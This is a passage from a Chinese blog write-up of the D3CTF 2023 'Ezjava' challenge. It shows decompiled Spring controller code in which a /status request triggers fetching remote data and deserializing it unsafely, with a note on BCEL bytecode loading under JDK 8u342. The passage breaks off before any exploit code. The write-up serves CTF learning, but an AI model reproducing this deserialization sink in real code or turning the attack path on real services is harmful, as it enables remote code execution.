<!doctype html><html lang=en dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content='从华哥的博客里面拿到附件，打开一看是有docker的，这可是一件美事啊，拉docker的时候顶针到有个8u342，最近对这个比较敏感，可以直接BCEL加载字节码\n有两个 jar 包两个服务\nflag 在 server 里面，并且 server 是不暴露的\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 package com.example.server.controller; import ch.qos.logback.core.spi.AbstractComponentTracker; import com.alibaba.fastjson2.JSON; import com.example.server.data.Result; import com.example.server.util.DefaultSerializer; import com.example.server.util.Request; import java.net.InetAddress; import java.util.ArrayList; import java.util.Base64; import java.util.List; import org.springframework.web.bind.annotation.GetMapping; import org.springframework.web.bind.annotation.RestController; @RestController /* loaded from: server-0.0.1-SNAPSHOT.jar:BOOT-INF/classes/com/example/server/controller/IndexController.class */ public class IndexController { public static List<String> denyClasses = new ArrayList(); public static long lastTimestamp = 0; @GetMapping({"/status"}) public Result status() { String msg; try { long currentTimestamp = System.currentTimeMillis(); msg = String.format("client %s is online", InetAddress.getLocalHost().getHostName()); if (currentTimestamp - lastTimestamp > AbstractComponentTracker.LINGERING_TIMEOUT) { update(); lastTimestamp = System.currentTimeMillis(); } } catch (Exception e) { msg = "client is online"; } return Result.of("200", msg); } public void update() { try { String json = Request.get("http://registry:8080/blacklist/jdk/get"); Result result = (Result) JSON.parseObject(json, Result.class); Object msg = result.getMessage(); if (msg instanceof String) { byte[] data = Base64.getDecoder().decode((String) msg); denyClasses = (List) DefaultSerializer.deserialize(data, denyClasses); } else if (msg instanceof List) { denyClasses = (List) msg; } } catch (Exception e) { e.printStackTrace(); } } } 只有一个 /status 路由，你每 10 秒访问一次该接口，就能强制触发一次后端的update()操作，在 update 中，会访问 http://registry:8080/blacklist/jdk/get 暂时还不知道这个是干嘛的，然后用 JSON.parseObject 去解析一下，最后会进行一个反序列化。\n'><title>D3CTF2023 Ezjava</title><link rel=canonical href=https://baozongwi.xyz/p/d3ctf-2023-ezjava/><link rel=stylesheet href=/scss/style.min.0fd9f1efab870423165ae7588bc203f4d3a9f9422c89352ef010f8c63e7225f0.css><meta property='og:title' content="D3CTF2023 Ezjava"><meta property='og:description' content='从华哥的博客里面拿到附件，打开一看是有docker的，这可是一件美事啊，拉docker的时候顶针到有个8u342，最近对这个比较敏感，可以直接BCEL加载字节码\n有两个 jar 包两个服务\nflag 在 server 里面，并且 server 是不暴露的\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 package com.example.server.controller; import ch.qos.logback.core.spi.AbstractComponentTracker; import com.alibaba.fastjson2.JSON; import com.example.server.data.Result; import com.example.server.util.DefaultSerializer; import com.example.server.util.Request; import java.net.InetAddress; import java.util.ArrayList; import java.util.Base64; import java.util.List; import org.springframework.web.bind.annotation.GetMapping; import org.springframework.web.bind.annotation.RestController; @RestController /* loaded from: server-0.0.1-SNAPSHOT.jar:BOOT-INF/classes/com/example/server/controller/IndexController.class */ public class IndexController { public static List<String> denyClasses = new ArrayList(); public static long lastTimestamp = 0; @GetMapping({"/status"}) public Result status() { String msg; try { long currentTimestamp = System.currentTimeMillis(); msg = String.format("client %s is online", InetAddress.getLocalHost().getHostName()); if (currentTimestamp - lastTimestamp > AbstractComponentTracker.LINGERING_TIMEOUT) { update(); lastTimestamp = System.currentTimeMillis(); } } catch (Exception e) { msg = "client is online"; } return Result.of("200", msg); } public void update() { try { String json = Request.get("http://registry:8080/blacklist/jdk/get"); Result result = (Result) JSON.parseObject(json, Result.class); Object msg = result.getMessage(); if (msg instanceof String) { byte[] data = Base64.getDecoder().decode((String) msg); denyClasses = (List) DefaultSerializer.deserialize(data, denyClasses); } else if (msg instanceof List) { denyClasses = (List) msg; } } catch (Exception e) { e.printStackTrace(); } } } 只有一个 /status 路由，你每 10 秒访问一次该接口，就能强制触发一次后端的update()操作，在 update 中，会访问 http://registry:8080/blacklist/jdk/get 暂时还不知道这个是干嘛的，然后用 JSON.parseObject 去解析一下，最后会进行一个反序列化。\n'><meta property='og:url' content='https://baozongwi.xyz/p/d3ctf-2023-ezjava/'><meta property='og:site_name' content="baozongwi's blog"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content><meta property='article:published_time' content='2025-11-20T21:27:35+08:00'><meta property='article:modified_time' content='2025-11-20T21:27:35+08:00'><meta name=twitter:title content="D3CTF2023 Ezjava"><meta name=twitter:description content='从华哥的博客里面拿到附件，打开一看是有docker的，这可是一件美事啊，拉docker的时候顶针到有个8u342，最近对这个比较敏感，可以直接BCEL加载字节码\n有两个 jar 包两个服务\nflag 在 server 里面，并且 server 是不暴露的\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 package com.example.server.controller; import ch.qos.logback.core.spi.AbstractComponentTracker; import com.alibaba.fastjson2.JSON; import com.example.server.data.Result; import com.example.server.util.DefaultSerializer; import com.example.server.util.Request; import java.net.InetAddress; import java.util.ArrayList; import java.util.Base64; import java.util.List; import org.springframework.web.bind.annotation.GetMapping; import org.springframework.web.bind.annotation.RestController; @RestController /* loaded from: server-0.0.1-SNAPSHOT.jar:BOOT-INF/classes/com/example/server/controller/IndexController.class */ public class IndexController { public static List<String> denyClasses = new ArrayList(); public static long lastTimestamp = 0; @GetMapping({"/status"}) public Result status() { String msg; try { long currentTimestamp = System.currentTimeMillis(); msg = String.format("client %s is online", InetAddress.getLocalHost().getHostName()); if (currentTimestamp - lastTimestamp > AbstractComponentTracker.LINGERING_TIMEOUT) { update(); lastTimestamp = System.currentTimeMillis(); } } catch (Exception e) { msg = "client is online"; } return Result.of("200", msg); } public void update() { try { String json = Request.get("http://registry:8080/blacklist/jdk/get"); Result result = (Result) JSON.parseObject(json, Result.class); Object msg = result.getMessage(); if (msg instanceof String) { byte[] data = Base64.getDecoder().decode((String) msg); denyClasses = (List) DefaultSerializer.deserialize(data, denyClasses); } else if (msg instanceof List) { denyClasses = (List) msg; } } catch (Exception e) { e.printStackTrace(); } } } 只有一个 /status 路由，你每 10 秒访问一次该接口，就能强制触发一次后端的update()操作，在 update 中，会访问 http://registry:8080/blacklist/jdk/get 暂时还不知道这个是干嘛的，然后用 JSON.parseObject 去解析一下，最后会进行一个反序列化。\n'><link rel="shortcut icon" href=/logo.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/acvtar_hu_773da4d2b586f7f.jpg width=300 height=300 class=site-logo loading=lazy alt=Avatar></a></figure><div class=site-meta><h1 class=site-name><a href=/>baozongwi's blog</a></h1></div></header><ol class=menu-social><li><a href=https://github.com/baozongwi target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=mailto:baozongwi@qq.com target=_blank title=Email rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-mail"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 7a2 2 0 012-2h14a2 2 0 012 2v10a2 2 0 01-2 2H5a2 2 0 01-2-2V7z"/><path d="M3 7l9 6 9-6"/></svg></a></li><li><a href=https://discord.com/users/1276595362970337414 target=_blank title=discord rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-brand-discord"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M8 12a1 1 0 102 0 1 1 0 00-2 0"/><path d="M14 12a1 1 0 102 0 1 1 0 00-2 0"/><path d="M15.5 17c0 1 1.5 3 2 3 1.5.0 2.833-1.667 3.5-3 .667-1.667.5-5.833-1.5-11.5-1.457-1.015-3-1.34-4.5-1.5l-.972 1.923a11.913 11.913.0 00-4.053.0L9 4c-1.5.16-3.043.485-4.5 1.5-2 5.667-2.167 9.833-1.5 11.5.667 1.333 2 3 3.5 3 .5.0 2-2 2-3"/><path d="M7 16.5c3.5 1 6.5 1 10 0"/></svg></a></li><li><a href=https://www.yuque.com/baozongwi/kkn04k target=_blank title=travel rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-map-pin"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 11a3 3 0 106 0 3 3 0 00-6 0"/><path d="M17.657 16.657 13.414 20.9a2 2 0 01-2.827.0l-4.244-4.243a8 8 0 1111.314.0z"/></svg></a></li><li><a href=/index.xml target=_blank title=RSS rel=me><svg class="icon icon-tabler icon-tabler-rss" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="5" cy="19" r="1"/><path d="M4 4a16 16 0 0116 16"/><path d="M4 11a9 9 0 019 9"/></svg></a></li><li><a href=https://www.travellings.cn/go.html target=_blank title=Travelling rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width=".5" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-tram-front-icon lucide-tram-front"><rect width="16" height="16" x="4" y="3" rx="2"/><path d="M4 11h16"/><path d="M12 3v8"/><path d="m8 19-2 3"/><path d="m18 22-2-3"/><path d="M8 15h.01"/><path d="M16 15h.01"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
<span>Home</span></a></li><li><a href=/about/><svg class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg>
<span>About</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
<span>Archives</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
<span>Links</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
<span>Search</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#exp1>exp1</a></li><li><a href=#exp2>exp2</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/javasec/>Javasec</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/d3ctf-2023-ezjava/>D3CTF2023 Ezjava</a></h2></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published datetime=2025-11-20T21:27:35+08:00>Nov 20, 2025</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>16 minute read</time></div></footer></div></header><section class=article-content><div class=outdated-notice><span class=outdated-notice__icon><svg class="icon icon-tabler icon-tabler-messages" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M21 14l-3-3h-7a1 1 0 01-1-1V4a1 1 0 011-1h9a1 1 0 011 1v10"/><path d="M14 15v2a1 1 0 01-1 1H6l-3 3V11a1 1 0 011-1h2"/></svg>
</span><span>友情提示：本文最后更新于 91 天前，文中的内容可能已有所发展或发生改变。</span></div><p>从华哥的博客里面拿到附件，打开一看是有docker的，这可是一件美事啊，拉docker的时候顶针到有个8u342，最近对这个比较敏感，可以直接BCEL加载字节码</p><p>有两个 jar 包两个服务</p><p><img src=/p/d3ctf-2023-ezjava/1.png width=716 height=368 loading=lazy alt=img></p><p>flag 在 server 里面，并且 server 是不暴露的</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kn>package</span><span class=w> </span><span class=nn>com.example.server.controller</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>ch.qos.logback.core.spi.AbstractComponentTracker</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>com.alibaba.fastjson2.JSON</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>com.example.server.data.Result</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>com.example.server.util.DefaultSerializer</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>com.example.server.util.Request</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.net.InetAddress</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.util.ArrayList</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.util.Base64</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.util.List</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>org.springframework.web.bind.annotation.GetMapping</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>org.springframework.web.bind.annotation.RestController</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=nd>@RestController</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=cm>/* loaded from: server-0.0.1-SNAPSHOT.jar:BOOT-INF/classes/com/example/server/controller/IndexController.class */</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>IndexController</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=n>List</span><span class=o>&lt;</span><span class=n>String</span><span class=o>&gt;</span><span class=w> </span><span class=n>denyClasses</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ArrayList</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>long</span><span class=w> </span><span class=n>lastTimestamp</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>0</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nd>@GetMapping</span><span class=p>({</span><span class=s>&#34;/status&#34;</span><span class=p>})</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=n>Result</span><span class=w> </span><span class=nf>status</span><span class=p>()</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>String</span><span class=w> </span><span class=n>msg</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=kt>long</span><span class=w> </span><span class=n>currentTimestamp</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>System</span><span class=p>.</span><span class=na>currentTimeMillis</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>msg</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>String</span><span class=p>.</span><span class=na>format</span><span class=p>(</span><span class=s>&#34;client %s is online&#34;</span><span class=p>,</span><span class=w> </span><span class=n>InetAddress</span><span class=p>.</span><span class=na>getLocalHost</span><span class=p>().</span><span class=na>getHostName</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>currentTimestamp</span><span class=w> </span><span class=o>-</span><span class=w> </span><span class=n>lastTimestamp</span><span class=w> </span><span class=o>&gt;</span><span class=w> </span><span class=n>AbstractComponentTracker</span><span class=p>.</span><span class=na>LINGERING_TIMEOUT</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>update</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>lastTimestamp</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>System</span><span class=p>.</span><span class=na>currentTimeMillis</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>Exception</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>msg</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;client is online&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>Result</span><span class=p>.</span><span class=na>of</span><span class=p>(</span><span class=s>&#34;200&#34;</span><span class=p>,</span><span class=w> </span><span class=n>msg</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>update</span><span class=p>()</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>String</span><span class=w> </span><span class=n>json</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Request</span><span class=p>.</span><span class=na>get</span><span class=p>(</span><span class=s>&#34;http://registry:8080/blacklist/jdk/get&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>Result</span><span class=w> </span><span class=n>result</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>Result</span><span class=p>)</span><span class=w> </span><span class=n>JSON</span><span class=p>.</span><span class=na>parseObject</span><span class=p>(</span><span class=n>json</span><span class=p>,</span><span class=w> </span><span class=n>Result</span><span class=p>.</span><span class=na>class</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>Object</span><span class=w> </span><span class=n>msg</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>result</span><span class=p>.</span><span class=na>getMessage</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>msg</span><span class=w> </span><span class=k>instanceof</span><span class=w> </span><span class=n>String</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>data</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Base64</span><span class=p>.</span><span class=na>getDecoder</span><span class=p>().</span><span class=na>decode</span><span class=p>((</span><span class=n>String</span><span class=p>)</span><span class=w> </span><span class=n>msg</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>denyClasses</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>List</span><span class=p>)</span><span class=w> </span><span class=n>DefaultSerializer</span><span class=p>.</span><span class=na>deserialize</span><span class=p>(</span><span class=n>data</span><span class=p>,</span><span class=w> </span><span class=n>denyClasses</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>msg</span><span class=w> </span><span class=k>instanceof</span><span class=w> </span><span class=n>List</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>denyClasses</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>List</span><span class=p>)</span><span class=w> </span><span class=n>msg</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>Exception</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>e</span><span class=p>.</span><span class=na>printStackTrace</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>只有一个 /status 路由，你每 10 秒访问一次该接口，就能强制触发一次后端的<code>update()</code>操作，在 update 中，会访问 http://registry:8080/blacklist/jdk/get 暂时还不知道这个是干嘛的，然后用 JSON.parseObject 去解析一下，最后会进行一个反序列化。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
